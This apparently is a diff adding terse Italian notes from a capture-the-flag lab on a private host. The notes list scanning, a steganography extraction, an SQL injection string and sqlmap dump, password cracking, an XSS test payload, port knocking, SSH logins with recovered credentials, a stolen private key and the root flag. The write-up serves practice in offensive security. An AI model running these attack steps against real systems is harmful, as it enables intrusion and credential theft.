@@ -1,0 +1,91 @@
+1) nmap -p- 192.168.1.101
+
+2) ssh e http
+
+3) gobuster dir -u http://192.168.1.101/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -o
+
+4) nikto -h http://192.168.1.101/
+
+5) navigazione nei meandri del web
+
+6) wget http://192.168.1.101/images/theta-logo.jpg
+
+7) steghide extract -sf theta-logo.jpg
+
+8) ' OR '1'='1, anna, luca, marco, milena
+
+9) ssh -p 2222 admin@192.168.1.101 ssh -p 2222 Password: admin123
+
+10) navigato nel file system della blackbox: nano, sync, df, ecc...
+
+11) sqlmap -u "http://192.168.1.101/oldsite/login.php" --data="username=admin&password=admin" --dump
+
+12) john --wordlist=/usr/share/wordlists/rockyou.txt hashblackbox.txt password:darkprincess
+<script>alert('XSS')</script>
+
+13) BurpSuite Whand = bacchetta decrypting: echo 'c2MqVDFsOVN5ezVi' | base64 -decho 'c2MqVDFsOVN5ezVi' | base64 -d 
+sc*T1l9Sy{5b
+
+14) knock 192.168.1.101 9220 1700 9991 55677 37789 7282
+
+15) ssh milena@192.168.1.101:22 password:darkprincess
+
+16) milenas'flag == FLAG{incanto_della_sapienza_123}
+
+
+17) cd shared, Mylovepotion, 
+ai(q4P7>(Fw9S3P == marco
+9iT(0F98!7^-I&h == luca
+darkprincess
+
+18) lucas'flag == FLAG{cuore_di_leone_456}
+
+19) luca: scaricare .theta-key.jpg.bk  download scp luca@192.168.1.252:/home/luca/.theta-key.jpg.bk /home/kali/Desktop/
+password steghide whand=c2MqVDFsOVN5ezV
+20) scaricato file id_rsa, OPENSSH PRIVATE KEY.
+
+
+20) chmod 600 id_rsa
+
+21) ssh id_rsa root@192.168.1.101
+
+22) flag root:
+                         .                                            
+                        / \                                           
+                       / _ \                                          
+                      |.o '.|                                         
+                      |'._.'|                                         
+                      |     |                                         
+                    ,'|  |  |`.                                       
+                   /  |  |  |  \                                      
+                   |,-'--|--'-.|                                      
+       .-._        /      |      \        _.-,                         
+       |   `-.__.-'       |       `-.__.-'   |                        
+        \                 |                 /                         
+         `\               |               /'                          
+           `\             |             /'                            
+             `\           |           /'                              
+               `\         |         /'                                
+                 `\       |       /'                                  
+                   `\     |     /'                                    
+                     `\   |   /'                                      
+                       `\ | /'                                        
+                         `|/                                           
+                          '                                            
+                         /|\                                           
+                        / | \                                          
+                       /  |  \                                         
+                      /   |   \                                        
+                     /    |    \                                       
+                    /     |     \                                      
+                   /      |      \                                     
+                  /       |       \                                    
+                 /        |        \                                   
+                /         |         \                                  
+               /          |          \                                 
+              /           |           \                                
+             /            |            \                               
+            /             |             \                              
+           /              |              \                             
+          /_______________|_______________\ 
+flag.txt  la magia non ha confini                      
